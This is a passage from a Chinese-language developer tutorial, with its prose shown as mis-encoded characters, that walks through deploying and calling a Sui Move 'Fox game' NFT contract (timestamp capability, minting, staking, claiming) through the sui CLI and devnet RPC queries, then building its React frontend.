class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">BarnRegistry</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        <span class="comment">// å…¶ä»–å±æ€§çœç•¥</span></span><br><span class="line">        <span class="comment">// fake_timestamp</span></span><br><span class="line">        timestamp: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">set_timestamp</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, current: <span class="type">u64</span>, _ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        reg.timestamp = current;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line">    fun <span class="title function_ invoke__">timestamp_now</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, _ctx: &amp;<span class="keyword">mut</span> TxContext): <span class="type">u64</span> &#123;</span><br><span class="line">        reg.timestamp</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå§‹åŒ–æ—¶ï¼Œå°†è®¾ç½®æ—¶é—´çš„èƒ½åŠ›ç»™åˆ°äº†ä¸€ä¸ªé¢„å…ˆç”Ÿæˆçš„ä¸“é—¨ç”¨äºè®¾ç½®æ—¶é—´æˆ³çš„åœ°å€ <code>0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</code>ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶: config.move</span></span><br><span class="line">        <span class="comment">// Manager cap to set time</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TimeManagerCap</span> has key, store &#123; id: UID &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">init_time_manager_cap</span>(ctx: &amp;<span class="keyword">mut</span> TxContext): TimeManagerCap &#123;</span><br><span class="line">        TimeManagerCap &#123; id: object::<span class="title function_ invoke__">new</span>(ctx) &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–‡ä»¶: fox.move</span></span><br><span class="line">        fun <span class="title function_ invoke__">init</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(config::<span class="title function_ invoke__">init_time_manager_cap</span>(ctx), @<span class="number">0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public entry fun <span class="title function_ invoke__">set_timestamp</span>(_: &amp;TimeManagerCap, global: &amp;<span class="keyword">mut</span> Global, current: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">set_timestamp</span>(&amp;<span class="keyword">mut</span> global.barn_registry, current, ctx)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®å®šæ—¶ä»»åŠ¡è¿›è¡Œæ—¶é—´æˆ³æ›´æ–°ï¼Œé€šè¿‡è°ƒç”¨è®¾ç½®æ—¶é—´çš„å‘½ä»¤è¿›è¡Œï¼Œè¯¦ç»†ç»“æœå¯ä»¥æŸ¥çœ‹ 3.2 èŠ‚åˆçº¦å‘½ä»¤è¡Œè°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> set_timestamp --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;time_cap&#125;</span> <span class="variable">$&#123;global&#125;</span> \&quot;$(<span class="built_in">date</span> +%s)\&quot; --gas-budget 30000</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä»‹ç»äº†åˆçº¦éƒ¨åˆ†çš„ä¸»è¦åŠŸèƒ½ï¼Œè¯¦ç»†çš„ä»£ç å¯ä»¥é˜…è¯»é¡¹ç›®ä»“åº“ã€‚</p><h2><span id="0x3-he-yue-bu-shu-he-diao-yong">0x3 åˆçº¦éƒ¨ç½²å’Œè°ƒç”¨</span></h2><p>ä¸‹é¢ï¼Œæˆ‘ä»¬é¦–å…ˆå°†éƒ¨ç½²åˆçº¦ï¼Œå¹¶é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œæ–¹æ³•çš„è°ƒç”¨ã€‚</p><h3><span id="3-1-he-yue-bu-shu">3.1 åˆçº¦éƒ¨ç½²</span></h3><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯ä»¥ç¼–è¯‘å’Œéƒ¨ç½²åˆçº¦ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui move build</span><br><span class="line">sui client publish . --gas-budget 300000</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sui client publish . --gas-budget 300000</span><br><span class="line">UPDATING GIT DEPENDENCY https://github.com/MystenLabs/sui.git</span><br><span class="line">INCLUDING DEPENDENCY MoveStdlib</span><br><span class="line">INCLUDING DEPENDENCY Sui</span><br><span class="line">BUILDING fox_game</span><br><span class="line">----- Certificate ----</span><br><span class="line">Transaction Hash: 5FZi4YxiiBJsCj67JSSzkVZvHdJjKKPtMMMrfGbmPXvH</span><br><span class="line">Transaction Signature: AA==@G9yAoybgfIEi7Wj8HFYeEFwG5WPtJ4FlJ+/jaMXFPyjWg4pUun3WQpB4VH5gim/FzqspMY7QAJcd0iTyJ910Dw==@htyihgkhXVia7MCmWeGtDeU96b7w1ivXPKBAV37DZoo=</span><br><span class="line">Signed Authorities Bitmap: RoaringBitmap&lt;[0, 1, 2]&gt;</span><br><span class="line">Transaction Kind : Publish</span><br><span class="line">Sender: 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a</span><br><span class="line">Gas Payment: Object ID: 0x0942e72397f46a831ce61003601cbb05697e7a83, version: 0x20f, digest: 0xc318f23ac2772738efe1b958be0b51e3c49d9c772d5aede9f41e1dc69edeb2ea</span><br><span class="line">Gas Price: 1</span><br><span class="line">Gas Budget: 300000</span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">    - çœç•¥äº†å…¶ä»–çš„åˆ›å»ºçš„å¯¹è±¡</span><br><span class="line">  - ID: 0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e , Owner: Shared</span><br><span class="line">  - ID: 0x1d525318e381f93dd2b2f043d2ed96400b4f16d9 , Owner: Immutable</span><br><span class="line">  - ID: 0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885 , Owner: Immutable</span><br><span class="line">  - ID: 0xe364474bd00b7544b9393f0a2b0af2dbea143fd3 , Owner: Account Address ( 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa )</span><br><span class="line">  - ID: 0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f , Owner: Shared</span><br><span class="line">  - ID: 0xe572b53c8fa93602ae97baca3a94e231c2917af6 , Owner: Account Address ( 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x0942e72397f46a831ce61003601cbb05697e7a83 , Owner: Account Address ( 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a )</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡äº¤æ˜“å“ˆå¸Œ <code>5FZi4YxiiBJsCj67JSSzkVZvHdJjKKPtMMMrfGbmPXvH</code> åœ¨ sui explorer ä¸­æŸ¥çœ‹éƒ¨ç½²çš„åˆçº¦ä¿¡æ¯ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/215304390-507211a2-638c-4c97-ae58-56ea419e8fcd.png" alt="Untitled 1"></p><p>é€šè¿‡ <code>sui client object &lt;object_id&gt;</code> å¯ä»¥æŸ¥çœ‹åˆ›å»ºçš„ object çš„å±æ€§ï¼Œå¯ä»¥çŸ¥é“ï¼š</p><ul><li><code>0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e</code> ä¸ºä»£å¸ EGG çš„ TreasuryCap çš„ ObjectId</li><li><code>0x1d525318e381f93dd2b2f043d2ed96400b4f16d9</code> ä¸º EGG çš„ CoinMetadata</li><li><code>0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</code> ä¸ºéƒ¨ç½²çš„åœ°å€</li><li><code>0xe364474bd00b7544b9393f0a2b0af2dbea143fd3</code> ä¸º TimeManagerCap</li><li><code>0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f</code> ä¸º Global å¯¹è±¡</li><li><code>0xe572b53c8fa93602ae97baca3a94e231c2917af6</code> ä¸º FoCManagerCap å¯¹è±¡</li></ul><p>è¿™äº›å¯¹è±¡å°†åœ¨ä¹‹åçš„å‘½ä»¤è¡Œè°ƒç”¨å’Œå‰ç«¯é¡¹ç›®ä¸­ä½¿ç”¨åˆ°ã€‚å…¶ä»–çœç•¥çš„åˆ›å»ºçš„å¯¹è±¡ä¸º Trait å¯¹è±¡ï¼Œåœ¨ä¹‹åä¸ä¼šä½¿ç”¨åˆ°ã€‚</p><h3><span id="3-2-he-yue-ming-ling-xing-diao-yong">3.2 åˆçº¦å‘½ä»¤è¡Œè°ƒç”¨</span></h3><ol><li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> fox_game=0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</span><br><span class="line"><span class="built_in">export</span> global=0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f</span><br><span class="line"><span class="built_in">export</span> egg_treasury=0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e</span><br><span class="line"><span class="built_in">export</span> time_cap=0xe364474bd00b7544b9393f0a2b0af2dbea143fd3</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®æ—¶é—´æˆ³</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># éœ€è¦åˆ‡æ¢åˆ°æ—¶é—´æˆ³çš„ç®¡ç†åœ°å€ 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span></span><br><span class="line">sui client switch --address 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶é—´æˆ³</span></span><br><span class="line">sui client call --<span class="keyword">function</span> set_timestamp --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;time_cap&#125;</span> <span class="variable">$&#123;global&#125;</span> \&quot;$(<span class="built_in">date</span> +%s)\&quot; --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line">curl https://fullnode.devnet.sui.io:443 -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObject&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | jq .result.details.data.fields.barn_registry</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœï¼Œå¯ä»¥çœ‹åˆ°æ—¶é—´æˆ³å·²ç»è¢«è®¾ç½®ä¸º 1674831518</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885::barn::BarnRegistry&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;egg_per_alpha&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: <span class="string">&quot;0x48136d916ea8a148ab864fdb1fc668f6e6dcf3ff&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;last_claim_timestamp&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1674831518&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_alpha_staked&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_chicken_staked&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_egg_earned&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unaccounted_rewards&quot;</span>: <span class="string">&quot;8518518&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„æ¯ä¸€æ­¥æ“ä½œå‰éƒ½éœ€è¦åŒæ­¥ä¸€æ¬¡æ—¶é—´æˆ³ï¼Œä¿è¯æ•°æ®æ­£ç¡®ã€‚</p></li><li><p>é“¸é€  NFT</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œé“¸é€ ï¼š</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰gas</span></span><br><span class="line">sui client switch --address 0x659f89084673bf4a993cdea89a94dabf93a2ddb4</span><br><span class="line">sui client gas</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">Object ID                  |  Gas Value </span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"> 0x0bd32adfbfc73e8daa42eef21b4e4e6cc7081240 |    25219   </span><br><span class="line"> 0x2ad1e472502aefd87c3767157391ebc1f169c6b5 |   9928743  </span><br><span class="line"> 0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05 |  10000000  </span><br><span class="line"> 0x5f2c80c89bedddf92f0dc32cfa16b0ecf76a4680 |  10000000  </span><br><span class="line"> 0x635ce8d2e9a9c0056ff1cd8591baee16fe010911 |  10000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mint 1 ä¸ª NFT</span></span><br><span class="line">sui client call --<span class="keyword">function</span> mint --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> <span class="variable">$&#123;egg_treasury&#125;</span> \&quot;1\&quot; <span class="literal">false</span> \[0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05\] \[\] --gas-budget 100000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœ</span></span><br><span class="line">----- Certificate ----</span><br><span class="line">Transaction Hash: 7p1nmTPYE9884gBCJL6sah2t6Vzh9P59MUeFVURXaEFx</span><br><span class="line">Transaction Signature: AA==@TNx7guUd7EjEg4s8jyOf+kTkuhVqmzrZWGKzcJNM3iHqcCRk0+pzITmFth8dYM6qKnYAvT3eeSkKNDUaQF2LAA==@oC1nequkpzyJfYuKx7DqIZFNUfF66e+6DEF1Urqo/EM=</span><br><span class="line">Signed Authorities Bitmap: RoaringBitmap&lt;[1, 2, 3]&gt;</span><br><span class="line">Transaction Kind : Call</span><br><span class="line">Package ID : 0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</span><br><span class="line">Module : fox</span><br><span class="line">Function : mint</span><br><span class="line">Arguments : [<span class="string">&quot;0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f&quot;</span>, <span class="string">&quot;0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e&quot;</span>, [1,0,0,0,0,0,0,0], <span class="string">&quot;&quot;</span>, [<span class="string">&quot;0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05&quot;</span>], []]</span><br><span class="line">Type Arguments : []</span><br><span class="line">Sender: 0x659f89084673bf4a993cdea89a94dabf93a2ddb4</span><br><span class="line">Gas Payment: Object ID: 0x2ad1e472502aefd87c3767157391ebc1f169c6b5, version: 0x215, digest: 0x197c624ca59151af7cd968b985062fa3e0dbf21711777d7b4602215664233c5b</span><br><span class="line">Gas Price: 1</span><br><span class="line">Gas Budget: 100000</span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x185aa8a244c74ddfe83c38618b46c744425cd7f5 , Owner: Object ID: ( 0x2ba674fcac290baa2927ff26110463f337237f0d )</span><br><span class="line">  - ID: 0x6917cbcf0e6e58184a98e05ad6bbc70a75755d28 , Owner: Object ID: ( 0x2ed343ceebf792a36b2ff0e918b801e34399f4ed )</span><br><span class="line">  - ID: 0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e , Owner: Shared</span><br><span class="line">  - ID: 0x2ad1e472502aefd87c3767157391ebc1f169c6b5 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">  - ID: 0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">  - ID: 0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f , Owner: Shared</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>\&quot;1\&quot;</code> è¡¨ç¤ºé“¸é€ çš„æ•°é‡ä¸º 1ï¼›</li><li><code>false</code> è¡¨ç¤ºä¸è´¨æŠ¼ï¼Œå¦‚æœè¦é“¸é€ çš„åŒæ—¶è¿›è¡Œè´¨æŠ¼ï¼Œå¯ä»¥ä¿®æ”¹ä¸º <code>true</code>ï¼›</li><li><code>\[0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05\]</code> æ˜¯ç”¨äºæ”¯ä»˜ 0.0099 SUI é“¸é€ è´¹ç”¨çš„ SUI å¯¹è±¡ï¼›</li><li><code>\[\]</code> è¡¨ç¤ºç”¨äºæ”¯ä»˜ <code>EGG</code> çš„å¯¹è±¡ã€‚</li></ul><p>å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„å¯¹è±¡ä¸­ï¼Œ <code>0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2</code> åœ¨åœ°å€ <code>0x659f89084673bf4a993cdea89a94dabf93a2ddb4</code> ä¹‹ä¸‹ï¼ŒæŸ¥çœ‹å±æ€§å¯ä»¥çœ‹åˆ°å¯¹åº”çš„ type ä¸º <code>0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885::token_helper::FoxOrChicken</code> ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬é“¸é€ å¾—åˆ°çš„ NFTï¼Œç›¸åº”çš„å…¶ä»–å±æ€§ä¹Ÿå¯ä»¥æŸ¥çœ‹åˆ°ï¼Œå‘½ä»¤è¾“å‡ºç»“æœå¯ä»¥æŸ¥çœ‹æ­¤ <a href="https://gist.github.com/qiwihui/86e7385c635f88b539ed2f032018ca28">gist</a>ã€‚</p><p>æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>sui_getObjectsOwnedByAddress</code> RPC æ¥å£å¯ä»¥æŸ¥çœ‹åœ°å€æ‰€æ‹¥æœ‰çš„å¯¹è±¡ï¼Œæ¯”å¦‚å¯¹äºåœ°å€ <code>0x659f89084673bf4a993cdea89a94dabf93a2ddb4</code> ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰å¯¹è±¡ï¼Œè¿‡æ»¤å³å¯æ‰¾åˆ°åˆ›å»ºçš„å¯¹è±¡ã€‚</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://fullnode.devnet.sui.io:443 -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObjectsOwnedByAddress&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0x659f89084673bf4a993cdea89a94dabf93a2ddb4&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>è´¨æŠ¼ NFT</p><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯¹å‰ä¸€æ­¥é“¸é€ çš„ NFT è¿›è¡Œè´¨æŠ¼ï¼š</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> add_many_to_barn_and_pack --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> \[0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2\] --gas-budget 100000</span><br></pre></td></tr></table></figure></li><li><p>è·å–æ”¶ç›Šå’Œ æå– NFT</p><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å–è´¨æŠ¼æ”¶ç›Š EGGï¼š</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> claim_many_from_barn_and_pack --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> <span class="variable">$&#123;egg_treasury&#125;</span> <span class="string">&#x27;[&quot;0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2&quot;]&#x27;</span> <span class="literal">false</span> --gas-budget 100000</span><br></pre></td></tr></table></figure><p>ç­‰ 48 å°æ—¶ä¹‹åï¼Œå°† <code>false</code> å˜ä¸º <code>true</code>ï¼Œå¯ä»¥è¿›è¡Œ Unstakeï¼Œå°†è´¨æŠ¼çš„ NFT æå–å‡ºæ¥ã€‚</p></li></ol><p>è‡³æ­¤ï¼Œå‘½ä»¤è¡Œæ“ä½œå®Œæˆã€‚</p><h2><span id="0x4-qian-duan-kai-fa">0x4 å‰ç«¯å¼€å‘</span></h2><h3><span id="4-1-scaffold-move-kai-fa-jiao-shou-jia">4.1 scaffold-move å¼€å‘è„šæ‰‹æ¶</span></h3><p>è¿™ä¸ªé¡¹ç›®åŸºäº NonceGeek DAO çš„ scaffold-move å¼€å‘è„šæ‰‹æ¶ï¼Œè¿™ä¸ªè„šæ‰‹æ¶ç›®å‰åŒ…å« Aptos å’Œ Sui ä¸¤ä¸ªå…¬é“¾çš„å‰ç«¯å¼€å‘å®ä¾‹ï¼Œå¯ä»¥å¯ä»¥åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¿«é€Ÿè¿›è¡Œ Sui çš„å‰ç«¯éƒ¨åˆ†å¼€å‘ã€‚</p><p>é€šè¿‡è¿è¡Œä»¥ä¸‹æ­¥éª¤å¯ä»¥è®¾ç½®å¼€å‘ç¯å¢ƒï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NonceGeek/scaffold-move.git</span><br><span class="line"><span class="built_in">cd</span> scaffold-move/scaffold-sui/</span><br><span class="line">yarn</span><br><span class="line">yarn dev</span><br></pre></td></tr></table></figure><h3><span id="4-2-xiang-mu-ye-mian-jie-gou">4.2 é¡¹ç›®é¡µé¢ç»“æ„</span></h3><p>é¡¹ç›®é¡µé¢ä¸»è¦åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼Œä½äº <code>src/pages</code> ç›®å½•ï¼šindexï¼Œgame å’Œ whitepapersï¼š</p><ul><li>indexï¼šå…¥å£é¡µé¢ï¼Œåšä¸ºæ¸¸æˆçš„å¼•å¯¼é¡µé¢ï¼›</li><li>gameï¼šä¸»è¦çš„é€»è¾‘é¡µé¢ï¼Œæ¶‰åŠé“¸é€ ï¼Œè´¨æŠ¼å’Œæå–ï¼›</li><li>whitepaperï¼šç™½çš®ä¹¦é¡µé¢ï¼Œä»‹ç»æ¸¸æˆæœºåˆ¶å’Œç©æ³•ã€‚</li></ul><p>æˆ‘ä»¬ä¹‹åçš„éƒ¨åˆ†ä¸»è¦èšç„¦åœ¨ game é¡µé¢ã€‚game é¡µé¢åŠŸèƒ½ä¸»è¦åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>èœå•æ ï¼šåŒ…å«logoï¼Œé¡µé¢å¯¼èˆªä»¥åŠé“¾æ¥é’±åŒ…ï¼›</li><li>å·¦ä¾§ Mint æ ï¼šä¸»è¦å½“å‰ mint çŠ¶æ€å’Œ mint æ“ä½œï¼›</li><li>å³ä¾§ Stake æ ï¼šä¸»è¦æ˜¯ Stakeï¼ŒUnstale å’Œ Collect EGG çš„æ“ä½œã€‚</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/215304399-47738ec4-8dc2-4063-9d1a-fa5ab05f963b.png" alt="Untitled 2"></p><p>å…¶ä¸­ï¼Œè´¨æŠ¼å’Œæå–æ—¶è¿›è¡Œçš„å¤šé€‰æ“ä½œï¼Œå¯ä»¥é€šè¿‡è®¾ç½®é€‰æ‹©å˜é‡è¿›è¡Œè¿‡æ»¤æ¥å®ç°ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [unstakedSelected, setUnstakedSelected] = useState&lt;<span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;&gt;([])</span><br><span class="line"><span class="keyword">const</span> [stakedSelected, setStakedSelected] = useState&lt;<span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;&gt;([]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è®¾ç½®æ·»åŠ å’Œåˆ é™¤æ“ä½œ</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addStaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([...stakedSelected, item])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeStaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setStakedSelected</span>(stakedSelected.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i !== item))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addUnstaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([...unstakedSelected, item])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeUnstaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>(unstakedSelected.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i !== item))</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// ä¹‹åæ·»åŠ å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">  <span class="comment">// å¤„ç†æœªè´¨æŠ¼çš„</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderUnstaked</span>(<span class="params">item: <span class="built_in">any</span>, <span class="keyword">type</span>: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> itemIn = unstakedSelected.<span class="title function_">includes</span>(item.<span class="property">objectId</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;item.objectId&#125;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginRight:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">marginLeft:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">border:</span> <span class="attr">itemIn</span> ? &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">red</span>&quot; <span class="attr">:</span> &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">rgb</span>(<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>)&quot;, <span class="attr">overflow:</span> &#x27;<span class="attr">hidden</span>&#x27;, <span class="attr">display:</span> &quot;<span class="attr">inline-block</span>&quot; &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;flex flex-col items-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> &quot;<span class="attr">0.75rem</span>&quot;, <span class="attr">height:</span> &quot;<span class="attr">1rem</span>&quot; &#125;&#125;&gt;</span>#&#123;item.index&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Image</span> <span 